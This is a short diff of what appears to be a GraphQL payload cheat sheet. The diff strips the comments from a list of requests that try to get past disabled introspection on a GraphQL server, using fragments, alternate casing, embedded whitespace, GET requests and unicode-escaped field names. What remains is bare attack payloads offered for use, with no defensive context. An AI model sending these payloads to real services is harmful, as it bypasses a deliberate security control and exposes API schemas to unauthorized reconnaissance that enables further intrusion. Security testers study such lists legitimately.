@@ -1,18 +1,9 @@
-# ---- Bypass Disabled Introspection ----
-# Method 1: __schema via fragment
 {"query":"fragment on __Schema { queryType { name } }"}
- 
-# Method 2: Lowercase/alternate casing
+
 {"query":"{__Schema{types{name}}}"}
- 
-# Method 3: Field suggestion (Clairvoyance technique)
-# If server returns "Did you mean X?" suggestions, use clairvoyance
- 
-# Method 4: Whitespace in typename
+
 {"query":"{ __schema\n{types{name}} }"}
- 
-# Method 5: POST vs GET
+
 GET /graphql?query={__schema{types{name}}}
- 
-# Method 6: Alternative characters
+
 {"query":"{\u005f\u005fschema{types{name}}}"}
